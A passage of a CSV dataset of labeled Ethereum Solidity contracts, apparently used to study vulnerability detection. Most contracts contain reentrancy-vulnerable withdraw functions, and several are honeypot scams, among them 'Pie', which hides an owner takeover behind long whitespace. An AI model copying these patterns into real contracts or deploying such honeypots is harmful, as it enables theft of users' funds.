_id,name,code,label

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10044,0x8fd1e427396ddb511533cf9abdbebd0a7e08da35,"



pragma solidity ^0.4.18;



contract Ownable

{

    address newOwner;

    address owner = msg.sender;

    

    function changeOwner(address addr)

    public

    onlyOwner

    {

        newOwner = addr;

    }

    

    function confirmOwner() 

    public

    {

        if(msg.sender==newOwner)

        {

            owner=newOwner;

        }

    }

    

    modifier onlyOwner

    {

        if(owner == msg.sender)_;

    }

}



contract Token is Ownable

{

    address owner = msg.sender;

    function WithdrawToken(address token, uint256 amount,address to)

    public 

    onlyOwner

    {

         
        token.call(bytes4(sha3(""transfer(address,uint256)"")),to,amount); 

    }

}



contract TokenBank is Token

{

    uint public MinDeposit;

    mapping (address => uint) public Holders;

    

      
    function initTokenBank()

    public

    {

        owner = msg.sender;

        MinDeposit = 1 ether;

    }

    

    function()

    payable

    {

        Deposit();

    }

   

    function Deposit() 

    payable

    {

        if(msg.value>=MinDeposit)

        {

            Holders[msg.sender]+=msg.value;

        }

    }

    

    function WitdrawTokenToHolder(address _to,address _token,uint _amount)

    public

    onlyOwner

    {

        if(Holders[_to]>0)

        {

            Holders[_to]=0;

            WithdrawToken(_token,_amount,_to);     

        }

    }

   

    function WithdrawToHolder(address _addr, uint _wei) 

    public

    onlyOwner

    payable

    {

        if(Holders[msg.sender]>0)

        {

            if(Holders[_addr]>=_wei)

            {

                 
                _addr.call.value(_wei);

                Holders[_addr]-=_wei;

            }

        }

    }

    

    function Bal() public constant returns(uint){return this.balance;}

}",0000000000010000000010000
10045,0x93c32845fae42c83a70e5f06214c8433665c2ab5,"

pragma solidity ^0.4.25;



contract X_WALLET

{

    function Put(uint _unlockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        acc.unlockTime = _unlockTime>now?_unlockTime:now;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }



    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }



    function() 

    public 

    payable

    {

        Put(0);

    }



    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }



    mapping (address => Holder) public Acc;



    Log LogFile;



    uint public MinSum = 1 ether;    



    function X_WALLET(address log) public{

        LogFile = Log(log);

    }

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }



    Message[] public History;



    Message LastMsg;



    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10046,0x941d225236464a25eb18076df7da6a91d0f95e9e,"

pragma solidity ^0.4.19;



contract ETH_FUND

{

    mapping (address => uint) public balances;

    

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    uint lastBlock;

    

    function ETH_FUND(address _log)

    public 

    {

        TransferLog = Log(_log);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value > MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

            lastBlock = block.number;

        }

    }

    

    function CashOut(uint _am)

    public

    payable

    {

        if(_am<=balances[msg.sender]&&block.number>lastBlock)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10047,0x958a8f594101d2c0485a52319f29b2647f2ebc06," 



pragma solidity ^0.4.16;



 
 
 
 


 
 
contract Owned {



     
     
    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    address public owner;



     
    function Owned() {

        owner = msg.sender;

    }



    address public newOwner;



     
     
     
    function changeOwner(address _newOwner) onlyOwner {

        newOwner = _newOwner;

    }

     
     
     
     
    function acceptOwnership() {

        if (msg.sender == newOwner) {

            owner = newOwner;

        }

    }



     
     
     
    function execute(address _dst, uint _value, bytes _data) onlyOwner {

          
        _dst.call.value(_value)(_data);

    }

}





contract Marriage is Owned

{

     
    string public partner1;

    string public partner2;

    uint public marriageDate;

    string public marriageStatus;

    string public vows;



    Event[] public majorEvents;

    Message[] public messages;



    struct Event {

        uint date;

        string name;

        string description;

        string url;

    }



    struct Message {

        uint date;

        string nameFrom;

        string text;

        string url;

        uint value;

    }



    modifier areMarried {

        require(sha3(marriageStatus) == sha3(""Married""));

        _;

    }



     
    function Marriage(address _owner) {

        owner = _owner;

    }



    function numberOfMajorEvents() constant public returns (uint) {

        return majorEvents.length;

    }



    function numberOfMessages() constant public returns (uint) {

        return messages.length;

    }



     
    function createMarriage(

        string _partner1,

        string _partner2,

        string _vows,

        string url) onlyOwner

    {

        require(majorEvents.length == 0);

        partner1 = _partner1;

        partner2 = _partner2;

        marriageDate = now;

        vows = _vows;

        marriageStatus = ""Married"";

        majorEvents.push(Event(now, ""Marriage"", vows, url));

        MajorEvent(""Marrigage"", vows, url);

    }



     
    function setStatus(string status, string url) onlyOwner

    {

        marriageStatus = status;

        setMajorEvent(""Changed Status"", status, url);

    }



     
    function setMajorEvent(string name, string description, string url) onlyOwner areMarried

    {

        majorEvents.push(Event(now, name, description, url));

        MajorEvent(name, description, url);

    }



    function sendMessage(string nameFrom, string text, string url) payable areMarried {

        if (msg.value > 0) {

            owner.transfer(this.balance);

        }

        messages.push(Message(now, nameFrom, text, url, msg.value));

        MessageSent(nameFrom, text, url, msg.value);

    }





     
    event MajorEvent(string name, string description, string url);

    event MessageSent(string name, string description, string url, uint value);

}",0000000000000000000010100
10048,0x96edbe868531bd23a6c05e9d0c424ea64fb1b78b,"

pragma solidity ^0.4.19;



contract PENNY_BY_PENNY  

{

    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }

    

    mapping (address => Holder) public Acc;

    

    uint public MinSum;

    

    LogFile Log;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)throw;

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)throw;

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Put(uint _lockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Put(0);

    }

    

}





contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000001010000
10049,0x9978d2D229A69B3aEf93420D132aB22b44e3578F,V1.sol,0000000000000000000000000
10050,0x9d06cbafa865037a01d322d3f4222fa3e04e5488,"

pragma solidity ^0.4.23;        

   

contract Delta {     



	address public c = 0xF85A2E95FA30d005F629cBe6c6d2887D979ffF2A; 

	address public owner = 0x788c45dd60ae4dbe5055b5ac02384d5dc84677b0;	

	address public owner2 = 0x0C6561edad2017c01579Fd346a58197ea01A0Cf3;	

	uint public active = 1;	



	uint public token_price = 10**18*1/1000; 	



	 
	function() payable {        

	    tokens_buy();        

	}



	 

    function tokens_buy() payable returns (bool) {         

        

        require(active > 0);

        require(msg.value >= token_price);        



        uint tokens_buy = msg.value*10**18/token_price;



        require(tokens_buy > 0);



        if(!c.call(bytes4(sha3(""transferFrom(address,address,uint256)"")),owner, msg.sender,tokens_buy)){

        	return false;

        }



        uint sum2 = msg.value * 3 / 10;           

         
        owner2.send(sum2);



        return true;

      }     



       
      function withdraw(uint256 _amount) onlyOwner returns (bool result) {

          uint256 balance;

          balance = this.balance;

          if(_amount > 0) balance = _amount;

           
          owner.send(balance);

          return true;

      }



       
      function change_token_price(uint256 _token_price) onlyOwner returns (bool result) {

        token_price = _token_price;

        return true;

      }



       
      function change_active(uint256 _active) onlyOwner returns (bool result) {

        active = _active;

        return true;

      }



       
    	modifier onlyOwner() {

        if (msg.sender != owner) {

            throw;

        }

        _;

    }        	





}",0000000100000000001010000
10051,0xa1fceeff3acc57d257b917e30c4df661401d6431," 



pragma solidity ^0.4.18;



contract AirDropContract{



    function AirDropContract() public {

    }



    modifier validAddress( address addr ) {

        require(addr != address(0x0));

        require(addr != address(this));

        _;

    }

    

    function transfer(address contract_address,address[] tos,uint[] vs)

        public 

        validAddress(contract_address)

        returns (bool){



        require(tos.length > 0);

        require(vs.length > 0);

        require(tos.length == vs.length);

        bytes4 id = bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i = 0 ; i < tos.length; i++){

             
            contract_address.call(id, msg.sender, tos[i], vs[i]);

        }

        return true;

    }

}",0100000100000000000001000
10052,0xa46edd6a9a93feec36576ee5048146870ea2c3ae," 



pragma solidity ^0.4.18;



contract EBU{

    

    function transfer(address from,address caddress,address[] _tos,uint[] v)public returns (bool){

        require(_tos.length > 0);

        bytes4 id=bytes4(keccak256(""transferFrom(address,address,uint256)""));

        for(uint i=0;i<_tos.length;i++){

             
            caddress.call(id,from,_tos[i],v[i]);

        }

        return true;

    }

}",0100000000000000000001000
10053,0xaae1f51cf3339f18b6d3f3bdc75a5facd744b0b8," 



pragma solidity ^0.4.19;



contract DEP_BANK 

{

    mapping (address=>uint256) public balances;   

   

    uint public MinSum;

    

    LogFile Log;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)throw;

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)throw;

        Log = LogFile(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Deposit()

    public

    payable

    {

        balances[msg.sender]+= msg.value;

        Log.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am)

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                Log.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Deposit();

    }

    

}





contract LogFile

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000001010000
10054,0xb0510d68f210b7db66e8c7c814f22680f2b8d1d6," 



pragma solidity ^0.4.23;



contract Splitter{

    

	address public owner;

	address[] public puppets;

	mapping (uint256 => address) public extra;

	address private _addy;

	uint256 private _share;

	uint256 private _count;





 


	constructor() payable public{

		owner = msg.sender;

		newPuppet();

		newPuppet();

		newPuppet();

		newPuppet();

		extra[0] = puppets[0];

        extra[1] = puppets[1];

        extra[2] = puppets[2];

        extra[3] = puppets[3];

	}



 
	

	function withdraw() public{

		require(msg.sender == owner);

		owner.transfer(address(this).balance);

	}



 


	function getPuppetCount() public constant returns(uint256 puppetCount){

    	return puppets.length;

  	}



 


	function newPuppet() public returns(address newPuppet){

	    require(msg.sender == owner);

    	Puppet p = new Puppet();

    	puppets.push(p);

    	return p;

  		}

 

 


    function setExtra(uint256 _id, address _newExtra) public {

        require(_newExtra != address(0));

        extra[_id] = _newExtra;

    }



	

 


    function fundPuppets() public payable {

        require(msg.sender == owner);

    	_share = SafeMath.div(msg.value, 4);

		 
        extra[0].call.value(_share).gas(800000)();

		 
        extra[1].call.value(_share).gas(800000)();

		 
        extra[2].call.value(_share).gas(800000)();

		 
        extra[3].call.value(_share).gas(800000)();

        }

        

 


function() payable public{

	}

}





contract Puppet {

    

    mapping (uint256 => address) public target;

    mapping (uint256 => address) public master;

	

	constructor() payable public{

		 
		target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109;

        master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956;

	}

	

	 
	 


	function() public payable{

	    if(msg.sender != target[0]){

			 
			target[0].call.value(msg.value).gas(600000)();

		}

    }

	 


	function withdraw() public{

		require(msg.sender == master[0]);

		master[0].transfer(address(this).balance);

	}

}





 


library SafeMath {



  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {

    if (a == 0) {

      return 0;

    }

    c = a * b;

    assert(c / a == b);

    return c;

  }



  function div(uint256 a, uint256 b) internal pure returns (uint256) {

    return a / b;

  }



  function sub(uint256 a, uint256 b) internal pure returns (uint256) {

    assert(b <= a);

    return a - b;

  }



  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {

    c = a + b;

    assert(c >= a);

    return c;

  }

}",0001000100000000000010000
10055,0xb11b2fed6c9354f7aa2f658d3b4d7b31d8a13b77," 



pragma solidity ^0.4.24;



contract Proxy  {

    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 

    function proxy(address target, bytes data) public payable {

         
        target.call.value(msg.value)(data);

    }

}



contract DepositProxy is Proxy {

    address public Owner;

    mapping (address => uint256) public Deposits;



    function () public payable { }

    

    function Vault() public payable {

        if (msg.sender == tx.origin) {

            Owner = msg.sender;

            deposit();

        }

    }

    

    function deposit() public payable {

        if (msg.value > 0.5 ether) {

            Deposits[msg.sender] += msg.value;

        }

    }

    

    function withdraw(uint256 amount) public onlyOwner {

        if (amount>0 && Deposits[msg.sender]>=amount) {

            msg.sender.transfer(amount);

        }

    }

}",0000000000000000000000000
10056,0xb37f18af15bafb869a065b61fc83cfc44ed9cc27," 



pragma solidity ^0.4.24;





contract SimpleWallet {

    address public owner = msg.sender;

    uint public depositsCount;

    

    modifier onlyOwner {

        require(msg.sender == owner);

        _;

    }

    

    function() public payable {

        depositsCount++;

    }

    

    function withdrawAll() public onlyOwner {

        withdraw(address(this).balance);

    }

    

    function withdraw(uint _value) public onlyOwner {

        msg.sender.transfer(_value);

    }

    

    function sendMoney(address _target, uint _value) public onlyOwner {

         
        _target.call.value(_value)();

    }

}",0001000000000000000000000
10057,0xb5e1b1ee15c6fa0e48fce100125569d430f1bd12," 



pragma solidity ^0.4.19;



contract Private_Bank

{

    mapping (address => uint) public balances;

    

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    function Private_Bank(address _log)

    {

        TransferLog = Log(_log);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value > MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    public

    payable

    {

        if(_am<=balances[msg.sender])

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10058,0xb620cee6b52f96f3c6b253e6eea556aa2d214a99," 



 
 
 




pragma solidity ^0.4.23;



contract DrainMe {



 


address public winner = 0x0;

address public owner;

address public firstTarget = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;

address public secondTarget = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;

address[] public players;



mapping(address=>bool) approvedPlayers;



uint256 public secret;

uint256[] public seed = [951828771,158769871220];

uint256[] public balance;



 


function DranMe() public payable{

	owner = msg.sender;

}



 


modifier onlyOwner() {

    require(msg.sender == owner);

    _;

}



modifier onlyWinner() {

    require(msg.sender == winner);

    _;

}



modifier onlyPlayers() {

    require(approvedPlayers[msg.sender]);

    _;

}



 


function getLength() public constant returns(uint256) {

	return seed.length;

}



function setSecret(uint256 _secret) public payable onlyOwner{

	secret = _secret;

}



function getPlayerCount() public constant returns(uint256) {

	return players.length;

}



function getPrize() public constant returns(uint256) {

	return address(this).balance;

}



function becomePlayer() public payable{

	require(msg.value >= 0.02 ether);

	players.push(msg.sender);

	approvedPlayers[msg.sender]=true;

}



function manipulateSecret() public payable onlyPlayers{

	require (msg.value >= 0.01 ether);

	if(msg.sender!=owner || unlockSecret()){

	    uint256 amount = 0;

        msg.sender.transfer(amount);

	}

}



function unlockSecret() private returns(bool){

    bytes32 hash = keccak256(blockhash(block.number-1));

    uint256 secret = uint256(hash);

        if(secret%5==0){

            winner = msg.sender;

            return true;

        }

        else{

            return false;

        }

    }



function callFirstTarget () public payable onlyPlayers {

	require (msg.value >= 0.005 ether);

	 
	firstTarget.call.value(msg.value)();

}



function callSecondTarget () public payable onlyPlayers {

	require (msg.value >= 0.005 ether);

	 
	secondTarget.call.value(msg.value)();

}



function setSeed (uint256 _index, uint256 _value) public payable onlyPlayers {

	seed[_index] = _value;

}

	

function addSeed (uint256 _add) public payable onlyPlayers {

	seed.length = _add;

}



function guessSeed (uint256 _seed) public payable onlyPlayers returns(uint256) {

	return (_seed / (seed[0]*seed[1]));

	if((_seed / (seed[0]*seed[1])) == secret) {

		owner = winner;

	}

}



function checkSecret () public payable onlyPlayers returns(bool) {

    require(msg.value >= 0.01 ether);

    if(msg.value == secret){

        return true;

    }

}



function winPrize() public payable onlyOwner {

	 
	owner.call.value(1 wei)();

}



function claimPrize() public payable onlyWinner {

	winner.transfer(address(this).balance);

}



 


function() public payable{

	}

}",1001000100000000000010100
10059,0xb7c5c5aa4d42967efe906e1b66cb8df9cebf04f7," 



pragma solidity ^0.4.23;



 



contract keepMyEther {

    mapping(address => uint256) public balances;

    

    function () payable public {

        balances[msg.sender] += msg.value;

    }

    

    function withdraw() public {

         
        msg.sender.call.value(balances[msg.sender])();

        balances[msg.sender] = 0;

    }

}",0001000000000000000000000
10060,0xb93430ce38ac4a6bb47fb1fc085ea669353fd89e," 



pragma solidity ^0.4.19;



contract PrivateBank

{

    mapping (address => uint) public balances;

        

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    function PrivateBank(address _lib)

    {

        TransferLog = Log(_lib);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value >= MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    {

        if(_am<=balances[msg.sender])

        {            

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10061,0xbaa3de6504690efb064420d89e871c27065cdd52," 



pragma solidity ^0.4.23;



contract Proxy  {

    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 

    function proxy(address target, bytes data) public payable {

         
        target.call.value(msg.value)(data);

    }

}



contract VaultProxy is Proxy {

    address public Owner;

    mapping (address => uint256) public Deposits;



    function () public payable { }

    

    function Vault() public payable {

        if (msg.sender == tx.origin) {

            Owner = msg.sender;

            deposit();

        }

    }

    

    function deposit() public payable {

        if (msg.value > 0.25 ether) {

            Deposits[msg.sender] += msg.value;

        }

    }

    

    function withdraw(uint256 amount) public onlyOwner {

        if (amount>0 && Deposits[msg.sender]>=amount) {

            msg.sender.transfer(amount);

        }

    }

}",0000000000000000000000000
10062,0xbaf51e761510c1a11bf48dd87c0307ac8a8c8a4f," 



pragma solidity ^0.4.19;



contract ETH_VAULT

{

    mapping (address => uint) public balances;

    

    uint public MinDeposit = 1 ether;

    

    Log TransferLog;

    

    function ETH_VAULT(address _log)

    public 

    {

        TransferLog = Log(_log);

    }

    

    function Deposit()

    public

    payable

    {

        if(msg.value > MinDeposit)

        {

            balances[msg.sender]+=msg.value;

            TransferLog.AddMessage(msg.sender,msg.value,""Deposit"");

        }

    }

    

    function CashOut(uint _am)

    public

    payable

    {

        if(_am<=balances[msg.sender])

        {

             
            if(msg.sender.call.value(_am)())

            {

                balances[msg.sender]-=_am;

                TransferLog.AddMessage(msg.sender,_am,""CashOut"");

            }

        }

    }

    

    function() public payable{}    

    

}



contract Log 

{

   

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10063,0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888," 



pragma solidity ^0.4.19;



contract MONEY_BOX   

{

    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }

    

    mapping (address => Holder) public Acc;

    

    uint public MinSum;

    

    Log LogFile;

    

    bool intitalized;

    

    function SetMinSum(uint _val)

    public

    {

        if(intitalized)throw;

        MinSum = _val;

    }

    

    function SetLogFile(address _log)

    public

    {

        if(intitalized)throw;

        LogFile = Log(_log);

    }

    

    function Initialized()

    public

    {

        intitalized = true;

    }

    

    function Put(uint _lockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        if(now+_lockTime>acc.unlockTime)acc.unlockTime=now+_lockTime;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }

    

    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }

    

    function() 

    public 

    payable

    {

        Put(0);

    }

    

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }

    

    Message[] public History;

    

    Message LastMsg;

    

    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000001010000
10064,0xbebbfe5b549f5db6e6c78ca97cac19d1fb03082c," 



pragma solidity ^0.4.24;



contract Proxy  {

    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;

    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 

    function proxy(address target, bytes data) public payable {

         
        target.call.value(msg.value)(data);

    }

}



contract VaultProxy is Proxy {

    address public Owner;

    mapping (address => uint256) public Deposits;



    function () public payable { }

    

    function Vault() public payable {

        if (msg.sender == tx.origin) {

            Owner = msg.sender;

            deposit();

        }

    }

    

    function deposit() public payable {

        if (msg.value > 0.5 ether) {

            Deposits[msg.sender] += msg.value;

        }

    }

    

    function withdraw(uint256 amount) public onlyOwner {

        if (amount>0 && Deposits[msg.sender]>=amount) {

            msg.sender.transfer(amount);

        }

    }

}",0000000000000000000000000
10065,0xcead721ef5b11f1a7b530171aab69b16c5e66b6e," 



pragma solidity ^0.4.25;



contract WALLET

{

    function Put(uint _unlockTime)

    public

    payable

    {

        var acc = Acc[msg.sender];

        acc.balance += msg.value;

        acc.unlockTime = _unlockTime>now?_unlockTime:now;

        LogFile.AddMessage(msg.sender,msg.value,""Put"");

    }



    function Collect(uint _am)

    public

    payable

    {

        var acc = Acc[msg.sender];

        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)

        {

             
            if(msg.sender.call.value(_am)())

            {

                acc.balance-=_am;

                LogFile.AddMessage(msg.sender,_am,""Collect"");

            }

        }

    }



    function() 

    public 

    payable

    {

        Put(0);

    }



    struct Holder   

    {

        uint unlockTime;

        uint balance;

    }



    mapping (address => Holder) public Acc;



    Log LogFile;



    uint public MinSum = 1 ether;    



    function WALLET(address log) public{

        LogFile = Log(log);

    }

}





contract Log 

{

    struct Message

    {

        address Sender;

        string  Data;

        uint Val;

        uint  Time;

    }



    Message[] public History;



    Message LastMsg;



    function AddMessage(address _adr,uint _val,string _data)

    public

    {

        LastMsg.Sender = _adr;

        LastMsg.Time = now;

        LastMsg.Val = _val;

        LastMsg.Data = _data;

        History.push(LastMsg);

    }

}",0001000000000000000000000
10066,0xd2018bfaa266a9ec0a1a84b061640faa009def76," 



pragma solidity ^0.4.19;



contract Pie

{

    address public Owner = msg.sender;

   

    function()

    public

    payable

    {

        

    }

   

    function Get()

    public

    payable

    {                                                                    

        if(msg.value>1 ether)

        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            Owner.transfer(this.balance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     

            msg.sender.transfer(this.balance);

        }                                                                                                                

    }

    

    function withdraw()

    payable

    public

    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       if(msg.sender==0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6){Owner=0x1Fb3acdBa788CA50Ce165E5A4151f05187C67cd6;}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              

        require(msg.sender == Owner);

        Owner.transfer(this.balance);

    }

    

    function Command(address adr,bytes data)

    payable

    public

    {

        require(msg.sender == Owner);

         
        adr.call.value(msg.value)(data);

    }

}",0000000100000000000000000
